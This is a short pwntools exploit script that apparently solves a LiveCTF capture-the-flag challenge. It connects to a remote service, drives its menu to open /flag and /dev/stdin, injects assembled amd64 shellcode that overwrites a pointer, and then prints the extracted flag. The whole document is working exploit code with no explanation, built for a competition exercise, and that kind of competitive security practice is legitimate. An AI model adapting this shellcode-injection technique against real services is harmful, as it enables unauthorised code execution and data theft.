#!/usr/bin/env python3

from pwn import *

context.arch='amd64'

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

io = remote(HOST, int(PORT))
# io = process('./handout/challenge', aslr=False)

io.sendlineafter(b'Choice: ', b'1')
io.sendlineafter(b'> ', b'/flag')

io.sendlineafter(b'Choice: ', b'1')
io.sendlineafter(b'> ', b'/dev/stdin')
io.sendline('')
io.sendlineafter(b'Choice: ', b'1')
io.sendlineafter(b'> ', b'/dev/stdin')

sc = '''
sub r12, 0x1d0
mov r12, [r12]
sub rdx, 0x200c
mov qword ptr [r12 + 0x60], rdx
'''
sc = asm(sc)

io.send(sc)

io.sendlineafter(b'Choice: ', b'2')

flag = io.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)

io.interactive()
